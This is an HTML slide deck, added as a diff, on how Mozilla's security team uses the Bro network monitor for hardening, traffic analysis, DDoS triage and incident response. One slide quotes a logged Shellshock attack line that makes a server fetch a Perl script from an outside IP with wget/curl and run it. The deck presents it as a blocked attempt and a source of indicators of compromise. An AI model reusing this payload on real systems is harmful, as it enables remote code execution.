@@ -1,0 +1,688 @@
+<!doctype html>
+<html lang="en">
+
+	<head>
+		<meta charset="utf-8">
+
+		<title>Extinguish your network fire with Bro</title>
+
+		<meta name="author" content="Michal Purzynski">
+
+		<meta name="apple-mobile-web-app-capable" content="yes" />
+		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
+
+		<link rel="stylesheet" href="css/reveal.css">
+		<link rel="stylesheet" href="css/theme/beige.css" id="theme">
+
+		<!-- Code syntax highlighting -->
+		<link rel="stylesheet" href="lib/css/zenburn.css">
+
+		<!-- Printing and PDF exports -->
+		<script>
+			var link = document.createElement( 'link' );
+			link.rel = 'stylesheet';
+			link.type = 'text/css';
+			link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
+			document.getElementsByTagName( 'head' )[0].appendChild( link );
+		</script>
+<!-- <link rel="stylesheet" href="css/print/pdf.css"> -->
+
+		<!--[if lt IE 9]>
+		<script src="lib/js/html5shiv.js"></script>
+		<![endif]-->
+	</head>
+
+	<body>
+
+		<div class="reveal">
+
+			<!-- Any section element inside of this container is displayed as a slide -->
+			<div class="slides">
+				<section>
+					<h2><span style="color: #CC5600;">Extinguish your network fire with Bro</span></h2>
+					<p>
+						<small>Created by <a href="https://log.nusec.eu">Michal Purzynski</a> / <a href="http://twitter.com/michalpurzynski">@michalpurzynski</a></small>
+					</p>
+				</section>
+
+                <section>
+                    <h2>Let me tell you a story</h2>
+                    <span class=fragment><p>...about how Mozilla security uses Bro</p></span>
+                     <span class="fragment"><p>Infrastructure</p></span>
+                     <span class="fragment"><p>Data disclosure</p></span>
+                     <span class="fragment"><p>An overloaded firewall</p></span>
+                     <span class="fragment"><p>A new vulnerability</p></span>
+                     <span class="fragment"><p>DDoS firefighting</p></span>
+                     <span class="fragment"><p>Bruteforcing</p></span>
+                     <span class="fragment"><p>Correlation</p></span>
+                    <aside class="notes">
+                    A team doing enterprise information security
+                    We don't do product security
+                    we respond to security investigations and incidents
+                    we help developers design and implement security controls
+                    we build tools & services to keep Mozilla secure
+                    Bro part of a larger NSM project. We use suricata and full packet capture, too.
+                    Bro is mostly used as a source of information and to fill the visibility gaps. We write our own scripts, too.
+                    This is going to be a practical presentation - I will show a few use cases where Bro played a siginificant role
+                    </aside>
+                </section>
+
+                <section>
+                    <h3>Wait, Bro reads user's data?!?!</h3>
+                    <span class="fragment"><p>No :-)</p></span>
+                    <span class="fragment"><p>You don't want your Firefox backdoored</p></span>
+                    <span class="fragment"><p>Protect the infrastructure^H^HFox</p></span>
+                    <span class="fragment">
+                        <img src="statics/keep-calm-and-blob-blob-blob.png" width="20%" />
+                    </span>
+                    <span class="fragment"><p>Firefox Sync is unreadable to us - ONLY YOU have the keys</p></span>
+                </section>
+
+				<section>
+					<h2>Infrastructure overview</h2>
+					<p>
+                        <span style="color: #CC5600;">1 + 1 </span> data center
+					</p>
+                    <p>
+                        <span style="color: #CC5600;">2</span> "business units"
+                    </p>
+                    <p>
+                        <span style="color: #CC5600;">5</span> offices (with Bro)
+                    </p>
+                    <p>
+                        <span style="color: #CC5600;">AWS</span> on the way
+                    </p>
+				</section>
+
+                <section>
+                    <h2>Infrastructure - capacity</h2>
+                        <table>
+                                <tr>
+                                    <td>14</td><td>sensors in SCL3</td>
+                                </tr>
+                                <tr>
+                                    <td>10</td><td>Bro</td>
+                                </tr>
+                                <tr>
+                                    <td>2</td><td>full packet capture</td>
+                                </tr>
+                                <tr>
+                                    <td>2</td><td>Suricata</td>
+                                </tr>
+                        </table>
+                    <span class="fragment" style="color: #CC5600;"><p>Lots of capacity - because you know, DDoS</p></span>
+                    <span class="fragment" style="color: #CC5600;"><h3>20Gbit/sec shipped to sensors</h3></span>
+                    <aside class="notes">
+                        that might seem like a lot of sensors
+                        some hardware is almost 3 years old, some brand new
+                        all sensors are single tasked
+                        Ubuntu 14 LTS with latest kernel
+                        We have stage and profiling sensors
+                        I want to have lots of free capacity for the hard time when DDoS comes to at least have partial visibility to fight it
+                        9 sensors with overloaded Bro are better than one netflow, is you ask me
+                        I can switch sensor's task in minutes with Ansible
+                    </aside>
+                </section>
+
+                <section>
+                    <h2>Infrastructure - sensors</h2>
+                    <p>Myricom</p>
+                    <p><span style="color: #CC5600;">64</span> or <span style="color: #CC5600;">128</span>GB RAM</p>
+                    <p><span style="color: #CC5600;">8</span> or <span style="color: #CC5600;">14</span> cores</p>
+                    <p><span style="color: #CC5600;">2.6</span>Ghz Turbo Boost enabled and <strong>active all the time</strong></p>
+                    <p><span style="color: #CC5600;">3.0</span>Ghz effeciently</p>
+                    <p><span style="color: #CC5600;">3.5</span>Gbit/sec of traffic per sensor? <strong>Easy!</strong></p>
+                </section>
+
+                <section>
+                    <h2>Supporting infrastructure</h2>
+                    <p>intelligence server, CIF, builders, MozDef</p>
+                </section>
+
+                <section>
+                    <video width="100%" preload="auto" controls>
+                        <source data-src="statics/mozdef_overview_and_ban.mp4" type="video/mp4" />
+                    </video>
+                </section>
+
+                <section>
+                    <h2>An isolated bastion</h2>
+                    <span class="fragment">
+                        <p>Ubuntu 14.04 LTS - <span style="color: #CC5600;">hardened</span> beyond means</p>
+                    </span>
+                    <span class="fragment">
+                        <p><span style="color: #CC5600;">minimal</span> target - run only <span style="color: #CC5600;">essentials</span></p>
+                    </span>
+                    <span class="fragment">
+                        <p>Hardening against <span style="color: #CC5600;">kernel exploits</span> - our /usr/local/sbin/rc.local is insane</p>
+                    </span>
+                    <span class="fragment">
+                        <p>Host based <span style="color: #CC5600;">firewall</span>, strict rules, allow <span style="color: #CC5600;">SSH</span> with <span style="color: #CC5600;">MFA</span> only</p>
+                    </span>
+                    <span class="fragment">
+                        <p>SSH with keys, no forwarding, allowed users</p>
+                    </span>
+                    <span class="fragment">
+                        <p>future - <span style="color: #CC5600;">sandbox</span> Bro?</p>
+                    </span>
+                </section>
+
+                <section>
+                    <h2>Designed to withstand everything*</h2>
+                    <p>
+                    <table>
+                        <tr>
+                            <td>
+                                <span class="fragment">
+                                    <img src="statics/Ucluelet_Lighthouse_Panorama.jpg" width="50%" />
+                                </span>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td>
+                            <span class="fragment">
+                                <blockquote cite="">
+                                    &ldquo;* as humanly possible. Restrictions and exclusions apply.&rdquo;
+                                </blockquote>
+                            </span>
+                            </td>
+                        </tr>
+                    </table>
+                    </p>
+                </section>
+
+                <section>
+                    <h2>Speaking about rc.local</h2>
+					<pre><code data-trim contenteditable>
+                        #!/bin/bash
+
+/opt/snf/sbin/myri_start_stop start myri_timesource=0
+rmmod kvm-intel
+rmmod kvm
+rmmod microcode
+rmmod lp
+rmmod parport
+rmmod 8021q
+rmmod mrp
+rmmod garp
+rmmod bridge
+rmmod stp
+rmmod llc
+rmmod psmouse
+
+modprobe msr
+modprobe xt_state
+modprobe xt_LOG
+modprobe xt_limit
+modprobe xt_tcpudp
+modprobe nf_conntrack_ipv4
+modprobe nf_defrag_ipv4
+modprobe xt_comment
+modprobe nf_conntrack
+modprobe ip6table_filter
+modprobe ip6_tables
+modprobe iptable_filter
+modprobe ip_tables
+modprobe x_tables
+
+iptables-restore < /etc/iptables/rules.v4
+ip6tables-restore < /etc/iptables/rules.v6
+
+echo -n deadline > /sys/block/sda/queue/scheduler
+
+cpuseq=$((`ls -lh /sys/devices/system/cpu/cpu*/cpufreq/scaling_max_freq | wc -l`-1))
+for i in `seq 0 "$cpuseq"`; do cpufreq-set -g performance -c $i; echo -n `cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_max_freq` > /sys/devices/system/cpu/cpu0/cpufreq/scaling_min_freq; done;
+
+/usr/libexec/tuned/pmqos-static.py cpu_dma_latency=0
+
+sysctl -w kernel.hotplug="/bin/true"
+sysctl -w kernel.modprobe="/bin/true"
+sysctl -w kernel.modules_disabled=1
+sysctl -w kernel.kexec_load_disabled=1
+sysctl -w net.netfilter.nf_conntrack_tcp_be_liberal=0
+sysctl -w net.netfilter.nf_conntrack_tcp_loose=0
+
+for D in $(ls /proc/irq)
+do
+    if [[ -x "/proc/irq/$D" && $D != "0" ]]
+    then
+        echo $D
+        echo 1 > /proc/irq/$D/smp_affinity
+    fi
+done
+for i in `pgrep rcu` ; do taskset -pc 0 $i ; done
+echo 1 > /sys/bus/workqueue/devices/writeback/cpumask
+echo 0 > /sys/bus/workqueue/devices/writeback/numa
+
+/etc/init.d/mozdefmq start
+
+exit 0
+					</code></pre>
+                </section>
+
+                <section>
+                    <h2>Detection is the new prevention</h2>
+                    <p>
+                    <table><tr>
+                        <td style="vertical-align:middle">
+                        <ul>
+                            <li>Think a "research and development", not a corporation</li>
+                            <li>BYOW(hatever) and connect everywhere</li>
+                            <li>Tons of cloud technologies - devices speak with everything</li>
+                            <li>Cannot slow down development</li>
+                        </ul></td>
+                        <td style="vertical-align:middle">
+                            <img src="statics/mozilla-rd-office.jpg" width=60%/>
+                            <img src="statics/IMG_0004.jpg" width=60%/>
+                        </td>  
+                    </tr></table>
+                    </p>
+						<aside class="notes">
+							Security mechanisms cannot slowdown anyone.
+                            A pain in a daily developer live, you are doing it wrong and people will complain for a good reason
+                            People use many different platforms to foxfood the experience on them.
+                            We use several video and audio conferencing technologies.
+                            creating an isolated and lock down network impossible and any security problem - challenging. We don't filter outbound traffic from many networks (except for a few UDP based protocols, which are rate limited or dropped on the edge). There is more and more connection to the cloud services from every possible device and saying "no" would harm functionality. This is why may companies like ours find themself in the detection only word. Detect early, react fast and most important - asses and understand the risk before. OK, there was a malware inside of the corporate network - find out who was infected, how long, what the results are. Erradictate it. Move on.
+						</aside>
+                </section>
+
+                <section>
+                    <h2>The flow of data</h2>
+                    <img src="statics/nsm_data_flow.png" width="90%" />
+                </section>
+
+                <section>
+                    <h2>Case - data disclosure</h2>
+                    <p>Private data on a public site</p>
+                    <span class="fragment"><p>Remove the data or restrict access</p></span>
+                    <span class="fragment"><p>Measure the damage done</p></span>
+                    <span class="fragment"><p>Is this IP MoCo or not MoCo?</p></span>
+                    <span class="fragment"><p>ssh.log, http.log - look for authenticated access</p></span>
+                    <span class="fragment"><p>Correlate with openvpn logs</p></span>
+                </section>
+
+                <section>
+                    <h2>Michal will show the http_headers_lb.bro</h2>
+                </section>
+
+                <section>
+                    <h2>Case - an overloaded firewall</h2>
+                    <p>Help needed - firewall dying from traffic</p>
+                    <p>Can you tell us what is inside our network?</p>
+                </section>
+
+                <section>
+                    <p>Approximation is your secret key</p>
+                    <pre>
+                        <code data-trim contenteditable>
+#fields ts  net inbytes outbytes
+#types  time    string  double  double
+1437006693.321003   10.22.24.0/24   3.988998e+09    8.437517e+09
+1437006693.321003   10.247.0.0/24   360373.0    50487.0
+1437006693.549610   10.248.75.0/24  1024142.0   882731.0
+1437006693.805239   10.22.27.0/24   6.858414e+09    8.711967e+09
+1437006694.000580   10.247.75.0/24  769386.0    654907.0
+1437006694.115753   10.8.81.0/24    555682601.0 7773518.0
+                        </code>
+                    <pre>
+                </section>
+
+                <section>
+                    <p>Let's see what do we send over IPSEC</p1>
+                    <pre>
+                        <code data-trim contenteditable>
+                            #fields ts  host    inbytes outbytes
+#types  time    string  double  double
+1402330049.280704   10.134.53.74-22/tcp 1193.0  2293.0
+1402330049.280704   10.22.74.161-22/tcp 1280673171.0    828619.0
+1402330049.280704   10.132.49.181-5666/tcp  29652.0 33516.0
+1402330049.335754   10.22.75.5-5666/tcp 9443.0  10766.0
+1402330049.339619   10.22.75.142-3001/tcp   6589180.0   1320.0
+1402330049.355417   10.132.50.89-5666/tcp   21180.0 23925.0
+1402330049.372056   10.134.59.7-22/tcp  777.0   1831.0
+1402330049.391699   10.134.56.177-22/tcp    777.0   1831.0
+1402330049.409463   10.132.159.72-22/tcp    777.0   1831.0
+1402330049.411677   10.134.48.234-5666/tcp  24004.0 27132.0
+1402330049.448121   10.134.56.161-22/tcp    777.0   1831.0
+1402330049.462249   10.132.157.188-22/tcp   777.0   1831.0
+1402330049.488083   10.132.56.115-22/tcp    777.0   1831.0
+1402330049.510947   10.132.49.117-5666/tcp  28240.0 31920.0
+1402330049.510947   10.134.49.111-5666/tcp  26828.0 30324.0
+1402330049.540847   10.134.157.89-22/tcp    1501.0  29187.0
+1402330049.544584   10.132.54.206-22/tcp    777.0   1613.0
+1402330049.568786   10.134.157.201-22/tcp   777.0   1831.0
+1402330049.582071   10.132.54.25-22/tcp 777.0   1613.0
+1402330049.589403   10.134.53.115-22/tcp    1657.0  49913.0
+1402330049.593933   10.22.74.161-80/tcp 109329.0    4.790218e+10
+                        </code>
+                    </pre>
+                </section>
+
+                <section>
+                    <pre>
+                        <code data-trim contenteditable>
+                        Top 20 traffic destinations (inbound)
+   1,053,418,110,191 pvtbuilds2.dmz.scl3.mozilla.com/22/tcp
+     312,725,676,745 pvtbuilds.pvt.build.mozilla.org/22/tcp
+      35,564,026,828 signing4.srv.releng.scl3.mozilla.com/9100/tcp
+      34,828,929,665 signing5.srv.releng.scl3.mozilla.com/9100/tcp
+      34,266,867,742 signing6.srv.releng.scl3.mozilla.com/9100/tcp
+      21,490,105,086 signing5.srv.releng.scl3.mozilla.com/9110/tcp
+      20,638,787,669 signing4.srv.releng.scl3.mozilla.com/9110/tcp
+      20,620,319,935 signing6.srv.releng.scl3.mozilla.com/9110/tcp
+       8,449,730,461 releng-foreman-vip.private.scl3.mozilla.com/3001/tcp
+       5,904,464,133 graphite-relay.private.scl3.mozilla.com/2003/tcp
+       4,689,536,765 buildbot-rw-vip.db.scl3.mozilla.com/3306/tcp
+       4,329,375,305 10.134.84.173       /443/tcp
+       1,765,965,301 10.134.84.158       /443/tcp
+       1,474,133,508 10.134.84.145       /443/tcp
+       1,351,413,363 10.134.84.175       /443/tcp
+       1,046,519,353 10.134.84.167       /443/tcp
+         936,841,862 releng-puppet2.srv.releng.scl3.mozilla.com/22/tcp
+         811,514,880 signing6.srv.releng.scl3.mozilla.com/9120/tcp
+         547,121,624 signing5.srv.releng.scl3.mozilla.com/9120/tcp
+         351,010,303 signing4.srv.releng.scl3.mozilla.com/9120/tcp
+                        </code>
+                    </pre>
+                </section>
+
+                <section>
+                    <pre>
+                        <code data-trim contenteditable>
+Top 20 traffic destinations (outbound)
+   6,949,831,218,831 pvtbuilds.pvt.build.mozilla.org/80/tcp
+   1,699,837,220,755 releng-zlb.dmz.scl3.mozilla.com/80/tcp
+      24,690,474,490 buildbot-rw-vip.db.scl3.mozilla.com/3306/tcp
+      22,996,645,863 signing5.srv.releng.scl3.mozilla.com/9100/tcp
+      18,838,656,345 signing4.srv.releng.scl3.mozilla.com/9100/tcp
+      17,412,532,053 signing6.srv.releng.scl3.mozilla.com/9100/tcp
+       9,994,450,122 releng-puppet2.srv.releng.scl3.mozilla.com/22/tcp
+       8,472,563,845 signing5.srv.releng.scl3.mozilla.com/9110/tcp
+       8,424,339,035 signing4.srv.releng.scl3.mozilla.com/9110/tcp
+       7,902,656,422 signing6.srv.releng.scl3.mozilla.com/9110/tcp
+       1,380,652,721 releng-puppet2.srv.releng.scl3.mozilla.com/80/tcp
+         958,458,343 releng-puppet1.srv.releng.scl3.mozilla.com/80/tcp
+         827,418,756 releng-puppet2.build.scl1.mozilla.com/80/tcp
+         592,181,489 pvtbuilds2.dmz.scl3.mozilla.com/22/tcp
+         578,675,700 signing6.srv.releng.scl3.mozilla.com/9120/tcp
+         481,676,841 signing5.srv.releng.scl3.mozilla.com/9120/tcp
+         215,878,078 signing4.srv.releng.scl3.mozilla.com/9120/tcp
+         209,851,033 pvtbuilds.pvt.build.mozilla.org/22/tcp
+          85,551,842 10.134.53.233       /43520/tcp
+          74,647,617 10.134.53.95        /55775/tcp
+                        </code>
+                    </pre>
+                </section>
+
+                <section>
+                    <h2>
+                        Scripts! Gimme some scripts!
+                    </h2>
+                </section>
+
+                <section>
+                    <h2>Lessons learned</h2>
+                    <p>Large files downloaded by multiple AWS machines</p>
+                    <p>Move services outside of IPSEC - HTTPS FTW</p>
+                    <p>Cache agressively on AWS side</p>
+                    <p>We ship whole files to be signed back and forth</p>
+                    <p>Sign a manifest instead of a file</p>
+                    <p>Most of our sessions are UDP port 53 - local DNS to the rescue</p>
+                    <p>Any many others</p>
+                </section>
+
+                <section>
+                    <h2>A dying firewall saved</h2>
+                    <blockquote cite="">
+                        &ldquo;That works out to a peak of about 762 Mbit/s outbound and 101 Mbit/s inbound for just pvtbuilds.&rdquo;
+                    </blockquote>
+                    <span class="fragment">
+                        <h2>We saved $$$ on hardware upgrades</h2>
+                    </span">
+                </section>
+
+                <section>
+                    <h2>Case - a new vulnerability</h2>
+                    <span class="fragment"><p>Do we run affected software? Where?</p></span>
+                    <span class="fragment"><p>Did we see exploitation attempts in the past?</p></span>
+                    <span class="fragment"><p>Can we disable this TLS version or that ciphersuite?</p></span>
+                </section>
+
+                <section>
+                    <pre>
+                        <code data-trim contenteditable>
+1421621023.588485   Cjr6Ed19qwDv4cPzXb  10.22.81.208    20234   10.22.81.75 80  2   GET 63.245.217.64   /phppath/php    -   () { :;};/usr/bin/perl -e 'print "Content-Type: text/plain\r\n\r\nXSUCCESS!";system("rm -rf /tmp/b.pl*;wget http://209.62.118.82/ou.pl -O /tmp/b.pl;curl -O /tmp/b.pl http://209.62.118.82/ou.pl;perl /tmp/b.pl;rm -rf /tmp/b.pl*");'   0   213 403 Forbidden   -   -   -   MozillaHTTPErrors::HTTP_ERRORX-FORWARDED-FOR -> 63.245.217.216  -   -   Fr74c34dvABXCZrJk   text/html   63.245.217.216  startpage2.webapp.scl3.mozilla.com
+                        </code>
+                    </pre>
+                </section>
+                
+                <section>
+                    <h2>An important activity during an investigation or an incident?</h2>
+                    <p>A feedback loop</p>
+                    <p>Lots of IOC in the previous slide</p>
+                </section>
+
+                <section>
+                    <h2>Case - a DDoS firefighting</h2>
+                    <p>On a beautiful day</p>
+                    <aside class="notes">
+                        An important thing - we wanted to trace behaviour per client and calculate a ratio of correct HTTP answers vs errors
+                        If you have sent us 1000 queries and 900 of them were errors you are up to no good
+                        Turned out to be impossible - too much memory
+                        On the other hand, if you are really scanning us, the topK approach will catch you sooner or later
+                    </aside>
+                </section>
+
+                <section>
+                    <p>
+                        1426626433.149432   -   -   -   -   -   -   -   -   -   MozillaHTTPErrors::Excessive_HTTP_Errors_Attacker   Excessive HTTP errors for requests from 63.245.214.82   2836 in 15.0 mins, eps: 0   63.245.214.82   nsm3-eth4-7 Notice::ACTION_LOG  900.000000  F   -   -   -   -   -
+                    </p>
+                    <p>
+                        1426626433.149432   -   -   -   -   -   -   -   -   -   MozillaHTTPErrors::Excessive_HTTP_Errors_Attacker   Excessive HTTP errors for requests from 54.224.132.122  2131 in 15.0 mins, eps: 0   54.224.132.122  nsm3-eth4-7 Notice::ACTION_LOG  900.000000  F   -   -   -   -   -
+                    </p>
+                </section>
+
+                <section>
+                    <p>
+                        hg.mozilla.org - lots of HTTP 503 (load balancer)
+                    </p>
+                    <p>
+                        soon other services followed
+                    </p>
+                    <p>
+                        tree closure, all hands on deck, Bro to rescue
+                    </p>
+                </section>
+
+                <section>
+                    <h2>
+                        What happened?
+                    </h2>
+                    <p>
+                        hg.mozilla.org overloaded, took bandwidth away from others
+                    </p>
+                    <pre>
+                        <code data-trim contenteditable>
+     46 54.175.86.1
+     47 54.164.121.47
+     47 54.174.151.233
+     48 52.0.40.223
+     48 54.164.16.80
+     48 54.165.134.155
+     49 54.152.126.0
+     50 54.165.30.166
+     52 52.0.43.77
+     52 54.152.53.133
+     53 52.1.232.233
+     53 54.173.69.40
+     57 54.174.136.144
+    423 63.245.214.162
+  18052 63.245.214.82
+                        </code>
+                    </pre>    
+                </section>
+
+                <section>
+                    <p>
+                        A very long taaaaaail
+                    </p>
+                    <p>
+                        Wait, are these our AWS instances?!?!
+                    </p>
+                    <p>
+                        63.245.214.82 is a source NAT, who is behind it?
+                    </p>
+                    <p>
+                        Correlated access to hg.mozilla.org from conn and http logs
+                    </p>
+                    <p>
+                        Yes, we DDoSed ourself
+                    </p>
+                </section>
+
+                <section>
+                    <h2>
+                        Bruteforcing is still alive
+                    </h2>
+                        <p>
+                            SSH
+                        </p>
+                        <p>
+                            All kinds of HTTP - through errors (generic!)
+                        </p>
+                        <p>
+                            Application layer, oh yeah! (bugzilla)
+                        </p>
+                </section>
+
+                <section>
+                    <h2>
+                        Time for Michal to show some more scripts 
+                    </h2>
+                </section>
+
+                <section>
+                    <h2>
+                        Vendors surprises - a wall of shame
+                    </h2>
+                    <p>
+                        Newrelic loves TLS_RSA_WITH_RC4_128
+                    </p>
+                    <p>
+                        Vidyo is into TLS_RSA_WITH_3DES_EDE_CBC_SHA
+                    </p>
+                    <p>
+                        Thirdlane (VOIP) checks for udpates with Base64 authentication over HTTP
+                    </p>
+                </section>
+
+                <section>
+                    <h2>Correlation</h2>
+                    <span class="fragment"><p></p></span>
+                    <span class="fragment"><p>PE analysis and malware detection</p></span>
+                    <span class="fragment"><p>Correlation between Suricata and Bro</p></span>
+                    <span class="fragment"><p>Bro extracted files to Yara</p></span>
+                    <span class="fragment"><p>Bro data in Tableau</p></span>
+                    <span class="fragment"><p>Bro to resolve Suricata alerts</p></span>
+                </section>
+
+                <section>
+                    <h2>Why correlation is hard</h2>
+                    <img src="statics/55090302.jpg" width="50%" />
+                </section>
+                <section>
+                    <h2>Why correlation is hard</h2>
+                    <h3>First step - alert on any intel hits</h3>
+                    <span class="fragment"><p>and get a constant stream of alerts</p></span>
+                    <span class="fragment"><p>good luck investigating that</p></span>
+                    <span class="fragment"><p>DNS prefetching in browsers (usually multiple IP) - resolved but didn’t connect</p></span>
+                    <aside class="notes">
+                    why - because intel lists are mostly generated automatically by systems that classified some traffic as malicious
+                    like it or not but we are in the cloud powered world now and the ip address belongs to someone else now
+                    there is more than one thing hosted under the same ip or domain name
+                    </aside>
+                </section>
+                <section>
+                    <h2>Why correlation is hard</h2>
+                    <h3>DNS + connection?</h3>
+                    <span class="fragment"><p>Much better!!</p></span>
+                    <span class="fragment"><p>challenge - the same site hosts both malicious code and harmless code</p></span>
+                    <span class="fragment"><p>at least you can investigate</p></span>
+                </section>
+                <section>
+                    <h2>Why correlation is hard</h2>
+                    <h3>Bro + Suricata?</h3>
+                    <span class="fragment"><p>IDS (Suricata) alert plus Bro intel hit on the same internal IP</p></span>
+                    <span class="fragment"><p>challenge - might be IP src and/or IP dst</p></span>
+                    <aside class="notes">
+                    More useful to resolve Suricata alerts than the other way around
+                    Frequently conn.log and http.log will tell enough that I don't have to look for a full packet capture
+                    </aside>
+                </section>
+                <section>
+                    <h2>Why correlation is hard</h2>
+                    <h3>Alert on multiple Intel hits</h3>
+                    <span class="fragment"><p>and get a brand new scanner detection that constantly goes off</p></span>
+                </section>
+                <section>
+                    <h2>Why correlation is hard</h2>
+                    <h3>Alert on multiple Intel hits</h3>
+                    <h3>Alert on Intel plus notice (or multiple notices)</h3>
+                    <span class="fragment"><p>will everything that is worth detecting make both notice and intel fire?</p></span>
+                    <aside class="notes">
+it’s still really good - show examples of the public SMTP server
+How to make it better?
+user login from two different IP or countries in a “short” time
+you are not making it through half of the world in six hours
+but your VPN can
+side note - why do the state sponsored attacks take place in a native time zone? I would make people attack USA during USA work hours, not my local time zone. Unless I want to blame someone else :)
+profile users, use machine learning and catch anomalies
+like Michal logging in from Poland at 9am. Michal sleeps till 10am, if not longer, and works long nights ;) Everyone in Mozilla knows it!
+                    </aside>
+                </section>
+                <section>
+                <h3>alert on successful logins from some countries</h3>
+                <h3>alert on successful logins during after work hours</h3>
+                <span class="fragment"><p>Mozilla never sleeps</p></span>
+                <span class="fragment"><p>our people are everywhere</p></span>
+                </section>
+
+                <section>
+                    <img src="statics/63424805.jpg" width="30%" />
+                    <p>https://github.com/michalpurzynski/bro-gramming</p>
+                    <p>https://github.com/michalpurzynski/ansible-nsm</p>
+                </section>
+
+</div></div>
+       <script src="lib/js/head.min.js"></script>
+        <script src="js/reveal.js"></script>
+
+        <script>
+
+            // Full list of configuration options available at:
+            // https://github.com/hakimel/reveal.js#configuration
+            Reveal.initialize({
+                controls: true,
+                progress: true,
+                history: true,
+                center: true,
+
+                transition: 'slide', // none/fade/slide/convex/concave/zoom
+
+                // Optional reveal.js plugins
+                dependencies: [
+                    { src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
+                    { src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+                    { src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+                    { src: 'plugin/highlight/highlight.js', async: true, condition: function() { return !!document.querySelector( 'pre code' ); }, callback: function() { hljs.initHighlightingOnLoad(); } },
+                    { src: 'plugin/zoom-js/zoom.js', async: true },
+                    { src: 'plugin/notes/notes.js', async: true }
+                ]
+            });
+
+        </script>
+
+	</body>
+</html>
